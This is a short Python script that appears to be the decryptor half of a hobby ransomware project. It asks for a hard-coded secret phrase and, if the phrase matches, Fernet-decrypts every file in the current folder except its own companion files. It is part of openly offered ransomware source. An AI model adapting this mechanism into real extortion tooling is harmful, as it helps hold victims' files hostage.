from cryptography.fernet import Fernet
import os

Files=[]

for file in os.listdir():
    if file=='ware.py' or file=="random.key" or file=="not_ware.py":
        continue
    if os.path.isfile(file):
        Files.append(file)

with open('random.key','rb') as ran:
    randi=ran.read()

secret_phrase="quidcorgiditch"
user_guess=input("Enter tho secret pharse to recover your files:  ")


if user_guess==secret_phrase:
    for file in Files:
        with open(file,'rb') as fille:
            garcon=fille.read()
            decrypted_files=Fernet(randi).decrypt(garcon)

        with open(file,'wb') as fille:
            real_contents=fille.write(decrypted_files)
    print("Congrats!!! You've successfully decrypted your files")
else:
    print("You entered the wrong secret phrase...Try again")

